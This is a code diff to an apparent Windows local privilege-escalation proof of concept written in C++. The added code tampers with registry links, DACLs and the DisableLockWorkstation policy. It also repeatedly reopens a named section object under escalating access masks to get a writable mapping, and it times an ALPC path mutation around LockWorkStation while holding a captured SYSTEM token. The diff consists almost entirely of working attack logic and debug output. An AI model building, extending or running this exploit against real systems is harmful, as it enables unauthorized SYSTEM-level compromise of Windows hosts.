+        TraceWin32Context(L"reg", L"RegSetValueExW(REG_DWORD)", openedPolicyPath ? openedPolicyPath : GP_REG_DISABLE_LOCK_VALUE_NAME, res);
         goto cleanup;
     }
     if (registry) {
         registry->disableLockSet = true;
     }
+    wprintf(L"reg_value=ok target=%ls value=%ls\n", openedPolicyPath ? openedPolicyPath : GP_REG_SYSTEM_POLICIES, GP_REG_DISABLE_LOCK_VALUE_NAME);
 
 exit:
     if (pACL) {
@@ -1136,6 +1445,9 @@ exit:
     if (htoken) {
         CloseHandle(htoken);
     }
+    if (policyKey) {
+        RegCloseKey(policyKey);
+    }
     if (hk) {
         if (!ret && linkKeyOpen) {
             DeleteRegistryLinkKey(hk);
@@ -1145,6 +1457,22 @@ exit:
     if (registry) {
         registry->succeeded = ret;
         registry->win32Error = ret ? ERROR_SUCCESS : (failure ? failure : ERROR_GEN_FAILURE);
+        if (!ret) {
+            wprintf(
+                L"registry_progress cloud_key=%u cloud_dacl=%u link_key=%u link_value=%u linked_target=%u system_key=%u system_dacl=%u disable_lock=%u\n",
+                registry->cloudFilesKeyCreated ? 1 : 0,
+                registry->cloudFilesDaclSet ? 1 : 0,
+                registry->blockedAppsLinkCreated ? 1 : 0,
+                registry->linkValueSet ? 1 : 0,
+                registry->linkedTargetTouched ? 1 : 0,
+                registry->policiesSystemKeyCreated ? 1 : 0,
+                registry->policiesDaclSet ? 1 : 0,
+                registry->disableLockSet ? 1 : 0);
+            wprintf(
+                L"registry_error code=%lu W32=0x%08lx\n",
+                registry->win32Error,
+                registry->win32Error);
+        }
     }
     LogRegistryState(L"P4");
     wprintf(L"registry=%ls\n", ret ? L"ok" : L"fail");
@@ -1156,12 +1484,13 @@ cleanup:
 }
 
 // Section mapping, compact fingerprinting, and optional prefix dump.
-static GpSectionView MapSectionView(HANDLE section)
+static GpSectionView MapSectionViewWithLabel(HANDLE section, const wchar_t* label)
 {
     GpSectionView view = { 0 };
     LARGE_INTEGER offset = { 0 };
     SIZE_T viewSize = 0;
     PVOID base = NULL;
+    const wchar_t* mapLabel = label ? label : L"map";
 
     NTSTATUS status = _NtMapViewOfSection(
         section,
@@ -1181,7 +1510,7 @@ static GpSectionView MapSectionView(HANDLE section)
         view.writable = true;
         view.mode = GpMapMode::ReadWrite;
         view.status = status;
-        wprintf(L"map=rw size=%zu\n", viewSize);
+        wprintf(L"%ls=rw size=%zu\n", mapLabel, viewSize);
         return view;
     }
 
@@ -1205,14 +1534,33 @@ static GpSectionView MapSectionView(HANDLE section)
         view.size = viewSize;
         view.writable = false;
         view.mode = GpMapMode::ReadOnly;
-        wprintf(L"map=ro size=%zu\n", viewSize);
+        wprintf(L"%ls=ro size=%zu\n", mapLabel, viewSize);
     }
     else {
         view.mode = GpMapMode::None;
-        wprintf(L"map=fail NT=0x%08lx\n", (DWORD)status);
+        wprintf(L"%ls=fail NT=0x%08lx\n", mapLabel, (DWORD)status);
     }
 
     return view;
+}
+
+static GpSectionView MapSectionView(HANDLE section)
+{
+    return MapSectionViewWithLabel(section, L"map");
+}
+
+static void ReleaseSectionView(GpSectionView* view)
+{
+    if (!view || !view->base) {
+        return;
+    }
+
+    _NtUnmapViewOfSection(GetCurrentProcess(), view->base);
+    view->base = NULL;
+    view->size = 0;
+    view->writable = false;
+    view->mode = GpMapMode::None;
+    view->status = STATUS_UNSUCCESSFUL;
 }
 
 static void DumpSectionPrefix(const GpSectionView* view)
@@ -1263,6 +1611,82 @@ static void CaptureSectionFingerprint(GpRunEvidence* run)
         GpMapModeName(run->view.mode));
 }
 
+static bool RefreshWritableSectionView(GpRunEvidence* run, POBJECT_ATTRIBUTES objattr)
+{
+    static const ACCESS_MASK desiredAccesses[] = {
+        SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE,
+        SECTION_QUERY | SECTION_MAP_WRITE,
+        SECTION_MAP_READ | SECTION_MAP_WRITE,
+        SECTION_MAP_WRITE,
+        SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE | WRITE_DAC,
+        MAXIMUM_ALLOWED
+    };
+
+    if (!run || !objattr) {
+        return false;
+    }
+
+    if (run->view.writable) {
+        wprintf(L"section_refresh=skip reason=already-writable\n");
+        return true;
+    }
+
+    for (SIZE_T i = 0; i < ARRAYSIZE(desiredAccesses); ++i) {
+        HANDLE candidate = NULL;
+        ACCESS_MASK granted = run->grantedAccess;
+        GpSectionView candidateView = { 0 };
+        ACCESS_MASK desired = desiredAccesses[i];
+        NTSTATUS status = _NtOpenSection(&candidate, desired, objattr);
+
+        wprintf(
+            L"section_reopen desired=0x%08lx NT=0x%08lx\n",
+            desired,
+            (DWORD)status);
+
+        if (!NT_SUCCESS(status) || !candidate) {
+            if (candidate) {
+                CloseHandle(candidate);
+            }
+            continue;
+        }
+
+        if (CaptureGrantedAccess(candidate, &granted)) {
+            PrintLabeledAccessEvidence(L"section_reopen_access", granted);
+        }
+        else {
+            wprintf(L"section_reopen_access=unknown\n");
+        }
+
+        candidateView = MapSectionViewWithLabel(candidate, L"section_reopen_map");
+        if (candidateView.writable) {
+            ReleaseSectionView(&run->view);
+            if (run->sectionHandle) {
+                CloseHandle(run->sectionHandle);
+            }
+
+            run->sectionHandle = candidate;
+            run->view = candidateView;
+            run->grantedAccess = granted;
+            wprintf(L"section_refresh=rw desired=0x%08lx handle=0x%p\n", desired, run->sectionHandle);
+            CaptureSectionFingerprint(run);
+            DumpSectionPrefix(&run->view);
+            return true;
+        }
+
+        ReleaseSectionView(&candidateView);
+        CloseHandle(candidate);
+    }
+
+    wprintf(L"section_refresh=ro-only\n");
+    PrintSectionObjectDiagnostics(L"refresh-ro-only", run->sectionHandle);
+    return false;
+}
+
+static bool HasTransitionGate(const GpRunEvidence& evidence)
+{
+    return evidence.desktopTiming.observed || evidence.lockSucceeded;
+}
+
 // ALPC primary-path hypothesis. This records only a controlled path-like mutation.
 static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
 {
@@ -1273,9 +1697,12 @@ static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
     run->alpc.attempted = true;
     run->alpc.verified = false;
 
-    if (!run->desktopTiming.observed) {
-        wprintf(L"alpc=skip timing\n");
+    if (!HasTransitionGate(*run)) {
+        wprintf(L"alpc=skip timing lock=%u\n", run->lockSucceeded ? 1 : 0);
         return false;
+    }
+    if (!run->desktopTiming.observed) {
+        wprintf(L"alpc=timing-fallback gate=lock-ok window_ms=%lu\n", run->desktopTiming.elapsedMs);
     }
 
     if (!portName || !portName[0] || wcslen(portName) >= MAX_PATH) {
@@ -1314,14 +1741,15 @@ static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
 #endif
 
     wprintf(
-        L"alpc=write verified=%u window_ms=%lu\n",
+        L"alpc=write verified=%u gate=%ls window_ms=%lu\n",
         run->alpc.verified ? 1 : 0,
+        run->desktopTiming.observed ? L"desktop" : L"lock",
         run->desktopTiming.elapsedMs);
     return run->alpc.verified;
 }
 
 // Desktop transition timing oracle based on the original PoC's OpenInputDesktop loop.
-static GpDesktopTimingEvidence WaitForDesktopTransitionWindow()
+static GpDesktopTimingEvidence WaitForDesktopTransitionWindow(const wchar_t* phase)
 {
     GpDesktopTimingEvidence timing = { 0 };
     ULONGLONG start = GetTickCount64();
@@ -1336,7 +1764,8 @@ static GpDesktopTimingEvidence WaitForDesktopTransitionWindow()
             timing.lastError = GetLastError();
             timing.elapsedMs = (DWORD)(GetTickCount64() - start);
             wprintf(
-                L"desktop=lost ms=%lu err=0x%08lx polls=%lu\n",
+                L"desktop=lost phase=%ls ms=%lu err=0x%08lx polls=%lu\n",
+                phase ? phase : L"<none>",
                 timing.elapsedMs,
                 timing.lastError,
                 timing.polls);
@@ -1351,7 +1780,8 @@ static GpDesktopTimingEvidence WaitForDesktopTransitionWindow()
             timing.lastError = ERROR_TIMEOUT;
             timing.elapsedMs = (DWORD)(now - start);
             wprintf(
-                L"desktop=timeout ms=%lu polls=%lu\n",
+                L"desktop=timeout phase=%ls ms=%lu polls=%lu\n",
+                phase ? phase : L"<none>",
                 timing.elapsedMs,
                 timing.polls);
             return timing;
@@ -1387,7 +1817,7 @@ static GpStatus AlpcPrecondition(const GpRunEvidence& evidence)
     if (!evidence.registry.succeeded) {
         return GpStatus::RegistryFailed;
     }
-    if (!evidence.desktopTiming.observed) {
+    if (!HasTransitionGate(evidence)) {
         return GpStatus::TimingMiss;
     }
     if (!evidence.alpc.verified) {
@@ -2066,10 +2496,6 @@ int wmain(int argc, wchar_t** argv)
     }
 
     if (run.registry.succeeded) {
-        run.desktopTiming = WaitForDesktopTransitionWindow();
-        ApplyAlpcPathMutation(&run, sinkRequest.alpcPortName);
-        primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
-
         run.lockAttempted = true;
         if (!LockWorkStation()) {
             run.lockWin32Error = GetLastError();
@@ -2078,7 +2504,15 @@ int wmain(int argc, wchar_t** argv)
         else {
             run.lockSucceeded = true;
             wprintf(L"lock=ok\n");
+            run.desktopTiming = WaitForDesktopTransitionWindow(L"post-lock");
+            if (!run.desktopTiming.observed) {
+                wprintf(L"section_refresh=continue reason=lock-ok timing=miss\n");
+            }
+            RefreshWritableSectionView(&run, &objattr);
         }
+
+        ApplyAlpcPathMutation(&run, sinkRequest.alpcPortName);
+        primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
     }
     else {
         primarySink = TouchBlockedSinkBoundaries(run, sinkRequest);
@@ -2090,10 +2524,7 @@ int wmain(int argc, wchar_t** argv)
     wprintf(L"hold=key\n");
 
 cleanup:
-    if (run.view.base) {
-        _NtUnmapViewOfSection(GetCurrentProcess(), run.view.base);
-        run.view.base = NULL;
-    }
+    ReleaseSectionView(&run.view);
 
     if (run.capturedSystemToken) {
         CloseHandle(run.capturedSystemToken);
